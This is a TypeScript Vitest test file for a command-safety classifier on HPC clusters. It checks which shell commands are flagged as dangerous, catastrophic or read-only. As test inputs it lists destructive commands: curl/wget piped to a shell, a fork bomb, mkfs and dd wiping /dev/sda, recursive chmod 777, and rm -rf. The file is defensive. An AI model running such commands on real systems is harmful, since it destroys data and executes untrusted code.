import { describe, expect, it } from 'vitest';
import { classifyCommandRisk, isCatastrophicCommand, isDangerousCommand, isJobTerminationCommand } from './commandSafety';

describe('isDangerousCommand', () => {
  it('flags job killing and process killing', () => {
    expect(isDangerousCommand('bkill 12345')).toBe(true);
    expect(isDangerousCommand('dkill 12345')).toBe(true);
    expect(isDangerousCommand('kill -9 1234')).toBe(true);
    expect(isDangerousCommand('pkill -u user')).toBe(true);
  });

  it('Donau 作业终止/控制命令（dkill/djctl）一律需要用户确认', () => {
    expect(isJobTerminationCommand('dkill 12345')).toBe(true);
    expect(isJobTerminationCommand('dkill --force 12345')).toBe(true);
    expect(isJobTerminationCommand('djctl stop 12345')).toBe(true);
    expect(isJobTerminationCommand('djctl resume 12345')).toBe(true);
    // 与 LSF/Slurm/PBS 对齐：终止作业不是机器级破坏（catastrophic 名单不含它们）
    expect(isCatastrophicCommand('dkill 12345')).toBe(false);
    // 查询类命令不受影响
    expect(isJobTerminationCommand('djob -l 12345')).toBe(false);
    expect(isDangerousCommand('djob')).toBe(false);
    expect(isDangerousCommand('dqueue')).toBe(false);
  });

  it('Donau 命令分类：dsub 记为作业操作，查询命令只读', () => {
    expect(classifyCommandRisk('dsub -s run.dsub')).toBe('job');
    expect(classifyCommandRisk('djob')).toBe('read');
    expect(classifyCommandRisk('dqueue')).toBe('read');
    expect(classifyCommandRisk('dnode')).toBe('read');
    expect(classifyCommandRisk('djob -ll 123 | head -40')).toBe('read');
  });

  it('flags destructive disk and permission operations', () => {
    expect(isDangerousCommand('mkfs.ext4 /dev/sda')).toBe(true);
    expect(isDangerousCommand('dd if=/dev/zero of=/dev/sda')).toBe(true);
    expect(isDangerousCommand('chmod -R 777 /data')).toBe(true);
    expect(isDangerousCommand('chmod 777 file.txt')).toBe(true);
  });

  it('flags shell-pipe installs and fork bombs', () => {
    expect(isDangerousCommand('curl http://x.sh | sh')).toBe(true);
    expect(isDangerousCommand('wget -qO- http://x | bash')).toBe(true);
    expect(isDangerousCommand(':(){:|:&};:')).toBe(true);
  });

  it('allows everyday cluster commands', () => {
    expect(isDangerousCommand('ls -lh')).toBe(false);
    expect(isDangerousCommand('bjobs -w')).toBe(false);
    expect(isDangerousCommand('bsub -q normal -n 8 "fastqc reads.fq"')).toBe(false);
    expect(isDangerousCommand('module load fastqc/0.11.9')).toBe(false);
    expect(isDangerousCommand('echo done > result.txt')).toBe(false);
    expect(isDangerousCommand('chmod 755 run.sh')).toBe(false);
    expect(isDangerousCommand('kill %1')).toBe(false);
  });

  it('classifies read, write, scheduler and network effects', () => {
    expect(classifyCommandRisk('zcat reads.fq.gz | wc -l')).toBe('read');
    expect(classifyCommandRisk('echo ok > result.txt')).toBe('write');
    expect(classifyCommandRisk('bsub < run.lsf')).toBe('job');
    expect(classifyCommandRisk('curl -O https://example.org/a.txt')).toBe('network');
    expect(classifyCommandRisk('rm -rf results')).toBe('destructive');
    expect(classifyCommandRisk('fastqc reads.fq')).toBe('unknown');
  });

  it('keeps diagnostic command chains read-only when echo or printf only label output', () => {
    expect(classifyCommandRisk('bjobs 75598506; echo "---"; bjobs -l 75598506 | head -80')).toBe('read');
    expect(classifyCommandRisk("pwd && printf '%s\\n' status && ls -la")).toBe('read');
    expect(classifyCommandRisk("cd /project && ls align | sed -n '1,60p' && cat meta/run.meta")).toBe('read');
    expect(classifyCommandRisk("export PATH=/opt/bin:$PATH && which awk && awk --version | head -1")).toBe('read');
    expect(classifyCommandRisk("sed -i 's/a/b/' run.sh")).toBe('write');
    expect(classifyCommandRisk('echo ok > result.txt')).toBe('write');
  });

  it('keeps only machine-level destructive commands behind the non-bypassable floor', () => {
    expect(isCatastrophicCommand('mkfs.ext4 /dev/sda')).toBe(true);
    expect(isCatastrophicCommand('dd if=/dev/zero of=/dev/sda')).toBe(true);
    expect(isCatastrophicCommand('shutdown -h now')).toBe(true);
    expect(isCatastrophicCommand('rm -rf old_results')).toBe(false);
    expect(isCatastrophicCommand('bkill 12345')).toBe(false);
  });
});
